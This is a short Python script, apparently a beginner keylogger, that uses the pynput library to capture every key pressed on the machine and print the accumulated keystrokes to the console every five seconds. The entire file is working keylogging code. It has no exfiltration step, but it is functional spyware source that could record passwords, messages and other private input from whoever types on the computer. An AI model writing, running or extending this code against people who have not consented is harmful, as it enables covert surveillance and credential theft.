# pip3 install pynput

import pynput.keyboard
import threading

log = ""


def key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()


key_listener = pynput.keyboard.Listener(on_press=key_press)
with key_listener:
    report()
    key_listener.join()
